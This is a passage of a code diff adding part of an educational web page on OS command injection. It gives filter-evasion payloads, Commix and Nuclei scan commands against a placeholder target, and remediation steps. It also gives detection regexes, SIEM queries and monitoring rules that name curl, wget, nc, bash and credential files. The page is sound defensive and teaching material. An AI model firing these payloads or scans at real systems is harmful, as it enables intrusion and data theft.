+      <div class="payload-grid">
+        <div class="payload-item"><code">ping${IFS}127.0.0.1${IFS};${IFS}id</code> – IFS substitution</div>
+        <div class="payload-item"><code>ping<>/dev/null;id</code> – File descriptor redirection</div>
+        <div class="payload-item"><code>ping/**/127.0.0.1/**/;/**/id</code> – Comment injection (globbing)</div>
+      </div>
+    `,
+    'tools-commands': `
+      <h4>Manual Testing Tools</h4>
+      <ul>
+        <li><strong>Burp Suite</strong> – Scanner + Repeater for manual testing</li>
+        <li><strong>curl/wget</strong> – Command-line HTTP clients for payload testing</li>
+        <li><strong>Postman</strong> – API testing with command injection payloads</li>
+      </ul>
+
+      <h4>Automated Scanners</h4>
+      <ul>
+        <li><strong>Commix</strong> – Specialized command injection scanner</li>
+        <li><strong>Nuclei</strong> – Template-based vulnerability scanner</li>
+        <li><strong>OWASP ZAP</strong> – Integrated security scanner</li>
+        <li><strong>Nessus</strong> – Enterprise vulnerability scanner</li>
+      </ul>
+
+      <h4>Command Examples</h4>
+      <pre><code># Commix
+commix --url="http://target.com/ping.php?host=127.0.0.1" --data="host=127.0.0.1"
+
+# Nuclei
+nuclei -u http://target.com -t /path/to/os-command-injection.yaml
+
+# Burp (headless)
+burpsuite --project-file=project.burp --scan-config=aggressive</code></pre>
+    `,
+    'references': `
+      <ul>
+        <li><a href="https://portswigger.net/web-security/os-command-injection" target="_blank">PortSwigger Web Academy: OS Command Injection</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank">PayloadsAllTheThings: Command Injection</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">OWASP: Command Injection</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank">CWE-78: Improper Neutralization of Special Elements used in an OS Command</a></li>
+        <li><a href="https://www.invicti.com/learn/command-injection/" target="_blank">Invicti: Command Injection Guide</a></li>
+      </ul>
+    `,
+    'retest-steps': `
+      <ol>
+        <li><strong>Verify Input Validation</strong> – Attempt injection with all identified separators (;, |, &, etc.)</li>
+        <li><strong>Test Whitelist Enforcement</strong> – Provide valid and invalid characters</li>
+        <li><strong>Confirm Safe API Usage</strong> – Review source code for subprocess/exec calls</li>
+        <li><strong>Check Privilege Level</strong> – Verify application runs as non-root</li>
+        <li><strong>Test Output Encoding</strong> – Ensure command output is properly escaped in responses</li>
+        <li><strong>Verify WAF Rules</strong> – Attempt known payloads through WAF</li>
+        <li><strong>Monitor Logging</strong> – Confirm injection attempts are logged</li>
+      </ol>
+    `,
+    'detection-logic': `
+      <h4>Python Detection Pattern</h4>
+      <pre><code class="language-python">import re
+
+def is_command_injection_attempt(input_str):
+    # Dangerous separators and metacharacters
+    dangerous_chars = re.compile(r'[;&|()$\`\\r\\n%0a%0d]')
+
+    # Command keywords
+    dangerous_commands = re.compile(r'\\b(cat|rm|chmod|curl|wget|nc|bash|sh)\\b')
+
+    if dangerous_chars.search(input_str):
+        return "Contains shell metacharacter"
+
+    if dangerous_commands.search(input_str):
+        return "Contains dangerous command"
+
+    return None</code></pre>
+
+      <h4>Regex Patterns for WAF</h4>
+      <pre><code># Basic metacharacters
+[;&|'\`]
+
+# Command substitution
+\\$\\(.*?\\)|\\`.*?\\`
+
+# Encoded payloads
+%0[ad]|\\\\x[0-9a-fA-F]{2}|\\\\[0-7]{3}</code></pre>
+    `,
+    'threat-hunting': `
+      <h4>Log Indicators</h4>
+      <ul>
+        <li>HTTP requests with command separators (;, |, &) in parameters</li>
+        <li>Multiple failed command execution attempts from same source</li>
+        <li>Process spawning from web application user (www-data, apache, etc.)</li>
+        <li>Suspicious commands: curl, wget, nc, bash, cat /etc/passwd, /etc/shadow</li>
+        <li>Encoded payloads (base64, hex, %xx encoding in URLs)</li>
+      </ul>
+
+      <h4>Network Indicators</h4>
+      <ul>
+        <li>Outbound connections from web server to unusual ports (4444, 6666, etc.)</li>
+        <li>DNS queries for suspicious domains from web server</li>
+        <li>Reverse shell traffic (bash/sh on unusual sockets)</li>
+        <li>Data exfiltration to attacker-controlled servers</li>
+      </ul>
+
+      <h4>Hunting Queries (SIEM)</h4>
+      <pre><code>index=web_servers
+| regex "uri=.*[;&|()$\`]"
+| stats count by source_ip, uri
+| where count > 5</code></pre>
+    `,
+    'defensive-detection': `
+      <h4>Detection Rule 1: Basic Metacharacter Detection</h4>
+      <pre><code>If any of [;, |, &, ||, &&, \`, $(), \\r\\n, %0a, %0d] found in:
+    - URL parameters
+    - POST body
+    - HTTP headers (User-Agent, Referrer, etc.)
+Then: Log and alert</code></pre>
+
+      <h4>Detection Rule 2: Command Keyword Detection</h4>
+      <pre><code>If any of [cat, chmod, curl, wget, nc, bash, sh, find, grep, whoami] found:
+    AND combined with shell metacharacters
+Then: High-severity alert</code></pre>
+
+      <h4>Detection Rule 3: Process-Level Monitoring</h4>
+      <pre><code>If web_server_user (www-data/apache) spawns:
+    - /bin/bash
+    - /bin/sh
+    - curl
+    - wget
+    - nc/netcat
+Then: Immediate investigation</code></pre>
+
+      <h4>Detection Rule 4: File Access Monitoring</h4>
+      <pre><code>If web_server_user reads:
+    - /etc/passwd
+    - /etc/shadow
+    - ~/.ssh/id_rsa
+    - AWS credentials files
+Then: Security incident alert</code></pre>
+    `
+  }
+};
+
+// Render the page
+document.addEventListener('DOMContentLoaded', () => {
+  const page = new VulnerabilityPage(commandInjectionData);
+  document.getElementById('app').innerHTML = page.render();
+});
 </script>
+
 </body>
 </html>
